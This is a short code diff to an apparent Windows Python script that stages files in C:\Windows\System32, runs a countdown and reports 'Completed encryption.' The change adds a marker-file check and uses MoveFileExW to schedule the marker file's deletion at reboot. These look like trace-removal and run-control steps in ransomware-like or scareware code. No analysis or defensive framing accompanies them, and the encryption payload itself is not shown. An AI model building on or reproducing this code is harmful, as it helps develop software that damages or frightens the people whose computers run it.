@@ -194,7 +194,7 @@ if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aespremv1.py"):
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
-
+import ctypes
 import os
 import shutil
 os.system('cls')
@@ -206,8 +206,8 @@ def check_uptime():
 
     current_time = datetime.now()
     uptime = current_time - boot_time
-    xxsd ="x"
-    if xxsd =="x":  
+    myprpaths = r"C:\pr.nsh"
+    if not os.path.exists(myprpaths): 
         time_remaining = timedelta(minutes=3)
         while time_remaining.total_seconds() > 0:
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -236,7 +236,8 @@ def check_uptime():
             print("Please wait...")
             time.sleep(1)
             time_remaining -= timedelta(seconds=1)
-
+        temp_file_path = r"C:\pr.nsh"
+        ctypes.windll.kernel32.MoveFileExW(temp_file_path, None, 4)
         print("Completed encryption.")
 
 
